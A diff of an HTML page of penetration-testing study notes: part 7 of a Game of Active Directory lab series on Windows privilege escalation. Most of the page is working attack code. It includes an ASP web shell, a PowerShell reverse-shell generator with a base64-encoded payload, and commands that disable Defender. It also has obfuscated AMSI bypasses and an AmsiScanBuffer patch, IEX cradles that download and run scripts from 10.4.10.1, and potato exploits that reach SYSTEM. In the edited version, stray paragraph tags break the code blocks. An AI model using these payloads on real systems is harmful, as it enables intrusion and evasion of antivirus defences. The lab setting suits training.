@@ -1,233 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GOAD Part 7 - Privilege Escalation | Mr Stark Study Notes</title>
-
+  <title>GOAD - Part 7 - Privilege Escalation | Mr Stark Study Notes</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-  
   <style>
-    /* GOAD-specific styles - Large fonts for readability */
-    .goad-content {
-      max-width: 100%;
-      margin: 0 auto;
-      padding: 30px;
-      font-size: 20px;
-    }
-    
-    .goad-content h1 {
-      color: var(--white-2);
-      font-size: 36px;
-      margin-bottom: 25px;
-    }
-    
-    .goad-content h2 {
-      color: var(--orange-yellow-crayola);
-      font-size: 30px;
-      margin: 35px 0 20px 0;
-      padding-bottom: 10px;
-      border-bottom: 1px solid var(--jet);
-    }
-    
-    .goad-content h3 {
-      color: var(--white-1);
-      font-size: 26px;
-      margin: 30px 0 15px 0;
-    }
-    
-    .goad-content h4 {
-      color: var(--white-2);
-      font-size: 24px;
-      margin: 25px 0 15px 0;
-    }
-    
-    .goad-content p {
-      color: var(--light-gray);
-      margin-bottom: 18px;
-      line-height: 1.8;
-      font-size: 20px;
-    }
-    
-    .goad-content code {
-      background: var(--onyx);
-      color: var(--orange-yellow-crayola);
-      padding: 3px 8px;
-      border-radius: 4px;
-      font-family: 'Courier New', monospace;
-      font-size: 18px;
-    }
-    
-    .goad-content pre {
-      background: var(--eerie-black-2);
-      border: 1px solid var(--jet);
-      border-radius: 8px;
-      padding: 20px;
-      overflow-x: auto;
-      margin: 20px 0;
-    }
-    
-    .goad-content pre code {
-      background: transparent;
-      color: var(--light-gray);
-      padding: 0;
-      font-size: 18px;
-    }
-    
-    .goad-content img {
-      max-width: 100%;
-      border-radius: 8px;
-      margin: 25px 0;
-      border: 1px solid var(--jet);
-    }
-    
-    .goad-content ul, .goad-content ol {
-      color: var(--light-gray);
-      margin: 20px 0;
-      padding-left: 40px;
-      font-size: 20px;
-    }
-    
-    .goad-content li {
-      margin-bottom: 10px;
-    }
-    
-    .goad-content strong {
-      color: var(--white-2);
-    }
-    
-    .goad-content blockquote {
-      border-left: 3px solid var(--orange-yellow-crayola);
-      padding-left: 20px;
-      margin: 25px 0;
-      color: var(--light-gray);
-      font-style: italic;
-      font-size: 20px;
-    }
-    
-    .goad-content table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 25px 0;
-      font-size: 18px;
-    }
-    
-    .goad-content th, .goad-content td {
-      border: 1px solid var(--jet);
-      padding: 15px;
-      text-align: left;
-    }
-    
-    .goad-content th {
-      background: var(--eerie-black-2);
-      color: var(--orange-yellow-crayola);
-    }
-    
-    .goad-content td {
-      color: var(--light-gray);
-    }
-    
-    .part-navigation {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 50px;
-      padding-top: 25px;
-      border-top: 1px solid var(--jet);
-      font-size: 20px;
-    }
-    
-    .part-navigation a {
-      color: var(--orange-yellow-crayola);
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      transition: color 0.3s;
-    }
-    
-    .part-navigation a:hover {
-      color: var(--white-2);
-    }
-    
-    .goad-sidebar-list {
-      list-style: none;
-      padding: 0;
-    }
-    
-    .goad-sidebar-list li {
-      margin-bottom: 8px;
-    }
-    
-    .goad-sidebar-list a {
-      color: var(--light-gray);
-      text-decoration: none;
-      display: block;
-      padding: 10px 15px;
-      border-radius: 8px;
-      transition: all 0.3s;
-      font-size: 16px;
-    }
-    
-    .goad-sidebar-list a:hover,
-    .goad-sidebar-list a.active {
-      background: var(--onyx);
-      color: var(--orange-yellow-crayola);
-    }
-    
-    .goad-sidebar-list a.active {
-      background: var(--orange-yellow-crayola);
-      color: var(--eerie-black-1);
-      font-weight: var(--fw-500);
-    }
-    
-    .back-link {
-      color: var(--light-gray);
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      margin-bottom: 25px;
-      font-size: 16px;
-    }
-    
-    .back-link:hover {
-      color: var(--orange-yellow-crayola);
-    }
+    .goad-content { max-width: 900px; margin: 0 auto; padding: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: var(--fs-1); margin-bottom: 20px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: var(--fs-2); margin: 30px 0 15px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: var(--fs-3); margin: 25px 0 10px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 15px; line-height: 1.8; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 15px; overflow-x: auto; margin: 15px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid var(--jet); }
+    .goad-content ul, .goad-content ol { color: var(--light-gray); margin: 15px 0; padding-left: 30px; }
+    .goad-content li { margin-bottom: 8px; }
+    .goad-content strong { color: var(--white-2); }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; display: flex; align-items: center; gap: 5px; transition: color 0.3s; }
+    .part-navigation a:hover { color: var(--white-2); }
+    .goad-sidebar-list { list-style: none; padding: 0; max-height: 60vh; overflow-y: auto; }
+    .goad-sidebar-list li { margin-bottom: 5px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; transition: all 0.3s; font-size: var(--fs-7); }
+    .goad-sidebar-list a:hover, .goad-sidebar-list a.active { background: var(--onyx); color: var(--orange-yellow-crayola); }
+    .goad-sidebar-list a.active { background: var(--orange-yellow-crayola); color: var(--eerie-black-1); font-weight: var(--fw-500); }
+    .back-link { color: var(--light-gray); text-decoration: none; display: flex; align-items: center; gap: 5px; margin-bottom: 20px; font-size: var(--fs-7); }
+    .back-link:hover { color: var(--orange-yellow-crayola); }
   </style>
 </head>
-
 <body>
-
   <main>
 
     <!-- Sidebar -->
     <aside class="sidebar" data-sidebar>
-
       <div class="sidebar-info">
-
         <figure class="avatar-box">
           <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
         </figure>
-
         <div class="info-content">
           <h1 class="name" title="Mr Stark">Mr Stark</h1>
           <p class="title">GOAD Series</p>
         </div>
-
         <button class="info_more-btn" data-sidebar-btn>
           <span>Show Parts</span>
           <ion-icon name="chevron-down"></ion-icon>
         </button>
-
       </div>
 
-            <div class="sidebar-info_more">
+      <div class="sidebar-info_more">
         <div class="separator"></div>
         
         <a href="../index.html" class="back-link">
@@ -240,19 +67,27 @@
         <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
         
         <ul class="goad-sidebar-list">
-          <li><a href="index.html">Overview</a></li>
-          <li><a href="part-1-reconnaissance.html">Part 1: Reconnaissance</a></li>
-          <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
-          <li><a href="part-3-authenticated-enumeration.html">Part 3: Auth Enum</a></li>
-          <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relay</a></li>
-          <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
-          <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
+          <li><a href="index.html" class="">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html" class="">Part 1: Reconnaissance & Scan</a></li>
+          <li><a href="part-2-finding-users.html" class="">Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html" class="">Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html" class="">Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html" class="">Part 5: ADCS</a></li>
+          <li><a href="part-6-mssql.html" class="">Part 6: MSSQL</a></li>
           <li><a href="part-7-privilege-escalation.html" class="active">Part 7: PrivEsc</a></li>
-          <li><a href="part-8-lateral-move.html">Part 8: Lateral Move</a></li>
-          <li><a href="part-9-delegations.html">Part 9: Delegations</a></li>
-          <li><a href="part-10-acl.html">Part 10: ACL</a></li>
-          <li><a href="part-11-trusts.html">Part 11: Trusts</a></li>
-          <li><a href="part-12-having-fun.html">Part 12: Having Fun</a></li>
+          <li><a href="part-8-lateral-move.html" class="">Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html" class="">Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html" class="">Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html" class="">Part 11: Trusts</a></li>
+          <li><a href="part-12-having-fun.html" class="">Part 12: Having Fun</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Other Labs:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="../ninja-hacker-academy/">Ninja Hacker Academy</a></li>
         </ul>
 
         <div class="separator"></div>
@@ -268,270 +103,570 @@
     </aside>
 
     <div class="main-content">
-
-<article class="about active" data-page="about">
-
-        <header class="h2 article-title">Privilege Escalation</header>
-
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Part 7: Privilege Escalation</header>
         <section class="goad-content">
+<strong>GOAD - part 7 - Privilege escalation - RBCD exploitation not working (KCD) Constrained - to be finished</strong>
+
+<p>
+    In this part section we will focus a little bit on privilege escalation.
+</p>
+
+<p>
+    Let’s assume that we do have a webpage exposed somewhere that allows us to upload files, at some point we were able to straightforward upload the file we want to with no filter at all or we were even able to bypass any filter mechanism or WAF.
+</p>
+
+    <img src="images/image-309.png" alt="Untitled">
+
+<p>
+    Let’s create a basic <code>.asp</code> payload for command execution and upload it.
+</p>
+
+<p>
+    > *At the time of writing, this avoid defender signature*
+    > 
+</p>
+
+    <pre><code class="language-python">    <%
+<p>
+    Function getResult(theParam)
+        Dim objSh, objResult
+        Set objSh = CreateObject("WScript.Shell")
+        Set objResult = objSh.exec(theParam)
+        getResult = objResult.StdOut.ReadAll
+    end Function
+    %>
+</p>
+    <HTML>
+        <BODY>
+<p>
+            Enter command:
+</p>
+                <FORM action="" method="POST">
+                    <input type="text" name="param" size=45 value="<%= myValue %>">
+                    <input type="submit" value="Run">
+                </FORM>
+                <p>
+<p>
+            Result :
+</p>
+            <% 
+<p>
+            myValue = request("param")
+            thisDir = getResult("cmd /c" & myValue)
+            Response.Write(thisDir)
+            %>
+</p>
+            </p>
+            <br>
+        </BODY>
+    </HTML>
+    </code></pre>
+
+<p>
+    After uploading it we can simply call it from the upload directory and we are able now to execute OS commands in the machine.
+</p>
+
+    <img src="images/image-310.png" alt="Untitled">
+
+<p>
+    We can continue from here using the webpage interface or we can get a reverse shell which is better.
+</p>
+
+<p>
+    Let’s use the following payload to generate a reverse shell and encode it to base64 so we can also bypass Windows Defender detection  as well.
+</p>
+
+    <pre><code class="language-python">    #!/usr/bin/env python
+<p>
+    import base64
+    import sys
+</p>
+
+<p>
+    if len(sys.argv) < 3:
+      print('usage : %s ip port' % sys.argv[0])
+      sys.exit(0)
+</p>
+
+<p>
+    payload="""
+    $c = New-Object System.Net.Sockets.TCPClient('%s',%s);
+    $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
+    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+        $sb = (iex $d 2>&1 | Out-String );
+        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+        $s.Write($sb,0,$sb.Length);
+        $s.Flush()
+    };
+    $c.Close()
+    """ % (sys.argv[1], sys.argv[2])
+</p>
+
+<p>
+    byte = payload.encode('utf-16-le')
+    b64 = base64.b64encode(byte)
+    print("powershell -exec bypass -enc %s" % b64.decode())
+</p>
+    </code></pre>
 
+<p>
+    Creating the reverse shell and encoding it to base64.
+</p>
 
-<p>In this part section we will focus a little bit on privilege escalation.</p>
-<p>Let’s assume that we do have a webpage exposed somewhere that allows us to upload files, at some point we were able to straightforward upload the file we want to with no filter at all or we were even able to bypass any filter mechanism or WAF.</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_1.png" alt="">
+    <code>./Shell_ConvB64.py 10.4.10.1 53</code>
 
+    <pre><code class="language-python">    powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA1ADMAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
+    </code></pre>
 
+<p>
+    Now we can use this payload in base64 and execute it on our webpage.
+</p>
 
-<p>Let’s create a basic .asp payload for command execution and upload it.</p>
-<pre><code><%
-Function getResult(theParam)
-    Dim objSh, objResult
-    Set objSh = CreateObject("WScript.Shell")
-    Set objResult = objSh.exec(theParam)
-    getResult = objResult.StdOut.ReadAll
-end Function
-%>
-<HTML>
-    <BODY>
-        Enter command:
-            <FORM action="" method="POST">
-                <input type="text" name="param" size=45 value="<%= myValue %>">
-                <input type="submit" value="Run">
-            </FORM>
-            <p>
-        Result :
-        <% 
-        myValue = request("param")
-        thisDir = getResult("cmd /c" & myValue)
-        Response.Write(thisDir)
-        %>
-        </p>
-        <br>
-    </BODY>
-</HTML></code></pre>
+    <code>rlwrap nc -lnvp 53</code>
 
+    <img src="images/image-311.png" alt="Untitled">
+
+<p>
+    As we can see above, I used <code>rlwrap</code> with <code>NetCat</code>.
+</p>
+
+<p>
+    Once we are inside the target machine, we can start with a basic user enumeration command:
+</p>
+    <code>whoami /all</code>
+
+    <img src="images/image-312.png" alt="Untitled">
+
+<p>
+    The command output shows us several valid info, User info, Group info and Privileges Info for this user.
+</p>
+
+<p>
+    As an IIS service user we got <code>SeImpersonatePrivilege</code> privilege, this privilege is enabled by default for this service account.
+</p>
+
+<p>
+    # <strong>Privesc</strong>
+</p>
+
+<p>
+    for this privesc we will focus on 2 types of privescs that got a “NOT FIX” by Microsoft which are PrintSpoofer and KrbRelay.
+</p>
+
+<p>
+    > *To do all following tests Windows Defender must enabled on all system. Castelblack got defender disabled by default, you should enable it before testing the privesc technics described here*
+    > 
+</p>
+
+<p>
+    ### Disable RealTime Defender using an Admin Account
+</p>
+
+    <code>Set-MpPreference -DisableRealtimeMonitoring $true
+<p>
+    Set-MpPreference -DisableIOAVProtection $true
+    set-MpPreference -DisableAutoExclusions $true</code>
+</p>
+
+<p>
+    ### Enable RealTime Defender using an Admin Account
+</p>
+
+    <code>Set-MpPreference -DisableRealtimeMonitoring $false
+<p>
+    Set-MpPreference -DisableIOAVProtection $false
+    set-MpPreference -DisableAutoExclusions $false</code>
+</p>
+
+<p>
+    ## <strong>AMSI - Anti-Malware Scan Interface bypass</strong>
+</p>
+
+<p>
+    At a high level, think of AMSI like a bridge which connects powershell to the antivirus software, every command or script we run inside powershell is fetched by AMSI and sent to installed antivirus software for inspection.
+    AMSI works on signature-based detection. This means that for every particular malicious keyword, URL, function or procedure, AMSI has a related signature in its database. So, if an attacker uses that same keyword in his code again, AMSI blocks the execution then and there.
+</p>
+
+<p>
+    There are several ways to bypass this protection and this is what we will be focused in this session.
+</p>
+
+<p>
+    You can check several AMSI bypass in this <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">Repo</a> by S3cur3Th1sSh1t.
+</p>
+
+<p>
+    There is also the website <a href="http://amsi.fail">amsi.fail</a> that generates obfuscated PowerShell snippets that break or disable AMSI for the current process.
+</p>
+
+<p>
+    This PDF is a nice resource to have a look on:
+</p>
+
+    <a href="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf">https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf</a>
+
+<p>
+    AMSI Bypass windows 11https://github.com/senzee1984/Amsi_Bypass_In_2023
+</p>
+
+<p>
+    If CMD non Admin right:
+</p>
+
+    <strong>RunWithRegistryNonAdmin.bat</strong>
+
+    <pre><code class="language-bash">    set COR_ENABLE_PROFILING=1
+<p>
+    set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+</p>
+
+<p>
+    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f
+</p>
+
+<p>
+    powershell
+</p>
+
+<p>
+    set COR_ENABLE_PROFILING=
+    set COR_PROFILER=
+    REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+</p>
+    </code></pre>
+
+<p>
+    If CMD Admin right
+</p>
+    <strong>RunWithPathAsAdmin.bat</strong>
+
+    <pre><code class="language-bash">    set COR_ENABLE_PROFILING=1
+<p>
+    set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+    set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
+</p>
+
+<p>
+    powershell
+</p>
+
+<p>
+    set COR_ENABLE_PROFILING=
+    set COR_PROFILER=
+    set COR_PROFILER_PATH=
+</p>
+    </code></pre>
+
+<p>
+    Then in PowerShell
+</p>
+
+    <pre><code class="language-bash">    S<code>eT-It</code>em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (<a href=" "{1}{0}"-F'F','rE' ">TYpE</a> ) ; ( Get-varI<code>A</code>BLE (('1Q'+'2U') +'zX' ) -VaL )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g<code>etf</code>iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE<code>T</code>VaLUE"(${n<code>ULl},${t</code>RuE} )
+    </code></pre>
+
+    <code>(New-Object Net.WebClient).DownloadFile('<a href="http://192.168.56.1:8080/PowerView.ps1','C:%5C%5Ctmp%5C%5CPowerView.ps1">http://10.4.10.1:8080/PowerView.ps1','C:\\tmp\\PowerView.ps1</a>')</code>
+
+<p>
+    Invisi-Shell https://github.com/OmerYa/Invisi-Shell
+</p>
+
+<p>
+    AMSI Bypass (if you are in Powershell revershe shell using Evil-WinRM remote access to the target)
+</p>
+
+    <pre><code class="language-bash">    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
+    </code></pre>
+
+<p>
+    Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level. If you want to know why you have to do that, you should read this blog 
+    post from @ShitSecure explaining the difference between powershell and .net AMSI level : <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a>
+</p>
+
+<p>
+    Now lets use Rasta-Mouse  AMSI-Bypass, add it to a .txt file and upload it to the target and execute it.
+</p>
+
+    <pre><code class="language-bash">    # Patching amsi.dll AmsiScanBuffer by rasta-mouse
+<p>
+    $Win32 = @"
+</p>
+
+<p>
+    using System;
+    using System.Runtime.InteropServices;
+</p>
+
+<p>
+    public class Win32 {
+</p>
+
+<p>
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+</p>
+
+<p>
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+</p>
+
+<p>
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+</p>
+
+<p>
+    }
+    "@
+</p>
+
+<p>
+    Add-Type $Win32
+</p>
+
+<p>
+    $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+    $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+    $p = 0
+    [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+    $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+</p>
+    </code></pre>
+
+<p>
+    EXECUTION:
+</p>
+
+<p>
+    AMSI Bypass
+</p>
+
+    <code>$x=[Ref].Assembly.GetType('<a href="http://system.management.automation.am/">System.Management.Automation.Am</a>'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text'[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</code>
+<p>
+    Disable AMSI at the .net level
+</p>
+    <code>(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')|IEX</code>
+
+    <img src="images/image-313.png" alt="Untitled">
+
+<ul>
+<li>Once we have done that, we can play what we want with the condition to don’t touch the disk!</li>
+<li>We can now play all our .net application by running them directly with execute assembly.</li>
+</ul>
+
+<p>
+    ## <strong>WinPeas without touching disk</strong>
+</p>
+
+<p>
+    Let’s use WinPEAS script to enumerate the machine and try to escalate our privilege. We can avoid AV detection now by hosting our LinPEAS on our attacking machine and load it in memory and play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly)
+</p>
+
+<p>
+    If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> and get everything done for you (thanks again to @ShitSecure).
+</p>
+
+    <pre><code class="language-bash">    iex(new-object net.webclient).downloadstring('http://10.4.10.1:8080/PowerSharpPack.ps1')
+<p>
+    PowerSharpPack -winPEAS
+</p>
+    </code></pre>
+
+<p>
+    After executing it we just have to wait for it and see the magic happening.
+</p>
+
+<p>
+    Analyzing winPEAS output, we can see that we do have some <code>SetImpersonatePrivilege</code> on the current user, so we can use it for privesc.
+</p>
+
+    <img src="images/image-314.png" alt="Untitled">
+
+<p>
+    ## <strong>SeImpersonatePrivilege to Authority\system</strong>
+</p>
+
+<p>
+    To escalate privileges from our low level user taking advantage of the <code>SetImpersonatePrivilege</code>, we can use one of the POTATOES techniques.
+</p>
+
+<p>
+    You can learn more about <strong>*Potatoes Windows Privilege Escalation</strong>* here: <a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a>
+</p>
+
+<p>
+    For this one we will use <a href="https://github.com/CCob/SweetPotato">SweetPotato</a> which is a compilation of all potatoes.
+</p>
+
+    <pre><code class="language-bash">    echo "@echo off" > runme.bat
+<p>
+    echo "start /b $(python3 Shell_ConvB64.py 10.4.10.1 4445)" >> runme.bat
+    echo "exit /b" >> runme.bat
+</p>
+    </code></pre>
+
+    <img src="images/image-315.png" alt="Untitled">
+
+<ul>
+<li>By default the tool use the <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">printSpoofer technic</a> by @itm4n</li>
+<li>If you don’t want to compile sweet patatoes we can also do that with BadPotato from PowerSharpPack (First we must bypass AMSI or it will be detected)</li>
+</ul>
+
+    <pre><code class="language-bash">    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
+<p>
+    iex(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')
+    iex(new-object net.webclient).downloadstring('http://10.4.10.1:8081/Invoke-BadPotato.ps1')
+    Invoke-BadPotato -Command "c:\tmp\runme.bat"
+</p>
+    </code></pre>
+
+<p>
+    We have been able to escalate our privilege from low level user to <code>NT Authority\System</code>
+</p>
+
+    <img src="images/image-316.png" alt="Untitled">
+
+<p>
+    # <strong>KrbRelay Up</strong>
+</p>
 
-<p>After uploading it we can simply call it from the upload directory and we are able now to execute OS commands in the machine.</p>
-<img src="./game-of-active-directory/part-7-privilege-escalation/images/screenshot_2.png" alt="">
+<p>
+    Another way to escalate privilege here is Kerberos Relay, to achieve that we can use krbRelayUp.
+    Since krbRelayUp is easily detected by Windows Defender we need to be very caution for this attack in order to avoid AV detection.
+</p>
 
+<p>
+    NOTE: The conditions to exploit this privesc is LDAP signing is <code>NOT</code> enforced, we can check that with NetExec ldap-signing module.
+</p>
 
-<p>We can continue from here using the webpage interface or we can get a reverse shell which is better.</p>
+<p>
+    Let’s use <a href="https://www.netexec.wiki/">NetExec</a> to enumerate it.
+</p>
 
-<p>Let’s use the following payload to generate a reverse shell and encode it to base64 so we can also bypass Windows Defender detection  as well.</p>
-<pre><code>#!/usr/bin/env python
-import base64
-import sys
+    <code>netexec ldap 10.4.10.10-12 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M ldap-checker</code>
 
-if len(sys.argv) < 3:
-  print('usage : %s ip port' % sys.argv[0])
-  sys.exit(0)
+    <img src="images/image-317.png" alt="Untitled">
 
-payload="""
-$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
-$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
-while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb = (iex $d 2>&1 | Out-String );
-    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
-    $s.Write($sb,0,$sb.Length);
-    $s.Flush()
-};
-$c.Close()
-""" % (sys.argv[1], sys.argv[2])
+<p>
+    We can see above that LDAP Signing is NOT enforced in hosts 10.4.10.10,11 and .12 as well.
+</p>
 
-byte = payload.encode('utf-16-le')
-b64 = base64.b64encode(byte)
-print("powershell -exec bypass -enc %s" % b64.decode())</code></pre>
+<p>
+    ### <strong>Add computer and RBCD</strong>
+</p>
 
+<p>
+    To exploit krbrelay by adding a computer, we must be able to add new Computer, we can check that with NetExec MAQ module as well.
+</p>
 
+    <code>netexec ldap 10.4.10.11 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M MAQ</code>
 
-<p>Creating the reverse shell and encoding it to base64.</p>
-<p>./Shell_ConvB64.py 10.4.10.1 53</p>
